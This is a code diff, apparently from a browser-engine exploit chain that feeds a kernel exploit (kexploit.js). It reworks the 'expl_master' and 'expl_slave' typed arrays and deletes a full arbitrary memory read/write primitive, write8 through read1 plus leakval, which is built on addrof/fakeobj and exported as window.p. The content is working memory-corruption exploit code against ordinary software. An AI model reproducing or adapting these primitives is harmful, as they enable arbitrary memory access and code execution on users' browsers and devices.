@@ -404,8 +404,9 @@ addEventListener('unhandledrejection', event => {
     //^ @sleirs' stuff. anything pre arb rw is magic, I'm happy I don't have to deal with that.
 
     //create compat stuff for kexploit.js
-    var expl_master = new Uint32Array(8);
-    var expl_slave = new Uint32Array(2);
+       var expl_master = new Uint32Array(new ArrayBuffer(1));
+    var expl_slave = new DataView(new ArrayBuffer(1));
+
 
     var addrof_expl_slave = addrof(expl_slave);
     var m = fakeobj(addrof(obj) + 16);
@@ -505,72 +506,6 @@ loader.onload = () => {
 }
 */
  
-    var prim = {
-        write8: function (addr, value) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            if (value instanceof int64) {
-                expl_slave[0] = value.low;
-                expl_slave[1] = value.hi;
-            } else {
-                expl_slave[0] = value;
-                expl_slave[1] = 0;
-            }
-        },
-        write4: function (addr, value) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            if (value instanceof int64) {
-                expl_slave[0] = value.low;
-            } else {
-                expl_slave[0] = value;
-            }
-        },
-        write2: function (addr, value) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            var tmp = expl_slave[0] & 0xFFFF0000;
-            if (value instanceof int64) {
-                expl_slave[0] = ((value.low & 0xFFFF) | tmp);
-            } else {
-                expl_slave[0] = ((value & 0xFFFF) | tmp);
-            }
-        },
-        write1: function (addr, value) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            var tmp = expl_slave[0] & 0xFFFFFF00;
-            if (value instanceof int64) {
-                expl_slave[0] = ((value.low & 0xFF) | tmp);
-            } else {
-                expl_slave[0] = ((value & 0xFF) | tmp);
-            }
-        },
-        read8: function (addr) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            return new int64(expl_slave[0], expl_slave[1]);
-        },
-        read4: function (addr) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            return expl_slave[0];
-        },
-        read2: function (addr) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            return expl_slave[0] & 0xFFFF;
-        },
-        read1: function (addr) {
-            expl_master[4] = addr.low;
-            expl_master[5] = addr.hi;
-            return expl_slave[0] & 0xFF;
-        },
-        leakval: function (obj) {
-            obj_slave.obj = obj;
-            return new int64(obj_master[4], obj_master[5]);
-        }
-    };
-    window.p = prim;
+  
     //run_hax();
 }
